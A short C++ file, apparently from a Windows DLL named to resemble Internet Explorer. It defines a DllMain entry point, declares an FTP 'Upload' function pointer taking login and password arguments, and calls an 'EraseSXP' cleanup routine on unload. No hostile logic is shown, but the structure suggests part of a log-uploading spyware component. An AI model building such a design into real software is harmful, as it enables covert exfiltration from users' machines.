// IntExplorer.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
void EraseSXP();
extern bool LOGMODE;
typedef void tpUpload(const char* ftp, const char* log, const char* pass, const char* folder, const char* filename);	
tpUpload* Upload=NULL;
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{	
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			EraseSXP();
			break;
	};			
	
    return TRUE;
};
